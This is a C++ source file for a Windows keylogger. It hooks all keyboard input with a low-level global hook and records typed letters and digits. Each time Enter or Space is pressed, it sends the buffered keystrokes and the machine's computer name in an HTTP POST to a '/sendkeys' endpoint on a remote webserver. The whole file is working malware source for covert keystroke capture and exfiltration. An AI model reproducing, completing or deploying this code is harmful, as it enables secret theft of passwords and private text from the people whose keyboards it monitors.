#include <iostream>
#include "headers/HttpRequest.h"
#include "headerSource/HttpRequest.cpp" // Custom Class made for building and sending HTTP POST requests to the webserver containing our keystrokes.
#include <windows.h>
#include <string>

#ifndef UNICODE // Have to have this in order to make converting from TCHAR to std::string easy due to character encoding issues.
typedef std::string String;
#else
typedef std::wstring String;
#endif

HHOOK keyboard;
KBDLLHOOKSTRUCT keyboardstruct;
std::string keystrokes;

LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
{
    if (keyboardcode >= 0)
    {
        keyboardstruct = *((KBDLLHOOKSTRUCT *)lParam);
        if (wParam == WM_KEYDOWN)
        {
            if (keyboardstruct.vkCode == 13 || keyboardstruct.vkCode == 32)
            {
                HttpRequest newRequest;
                TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD nameLength = MAX_COMPUTERNAME_LENGTH + 1;
                if (!GetComputerName(computerName, &nameLength))
                {
                    newRequest.setComputerName("Unknown");
                }
                else
                {
                    String temp = computerName;
                    String temp2(temp.begin(), temp.end());
                    newRequest.setComputerName(temp2);
                }
                newRequest.setKeystrokes(keystrokes);
                newRequest.setMethod("POST");
                newRequest.setUrl("/sendkeys");
                newRequest.buildRequest();
                newRequest.sendRequest();
                keystrokes.clear();
            }
            else
            {
                if(keyboardstruct.vkCode >= 0x30 && keyboardstruct.vkCode <= 0x5A){
                    if (GetKeyState(16) < 0 || GetKeyState(VK_CAPITAL) == 1)
                    {
                        char c = MapVirtualKey(keyboardstruct.vkCode, 2);
                        std::cout << c << std::endl;
                        keystrokes.append(std::string(1, (char)toupper(c)));
                    }
                    else
                    {
                        char c = MapVirtualKey(keyboardstruct.vkCode, 2);
                        std::cout << c << std::endl;
                        keystrokes.append(std::string(1, (char)tolower(c)));
                    }
                }
            }
        }
    }
    return CallNextHookEx(keyboard, keyboardcode, wParam, lParam);
}

void CreateHook()
{
    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);
}

int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr, int cmd)
{
    CreateHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}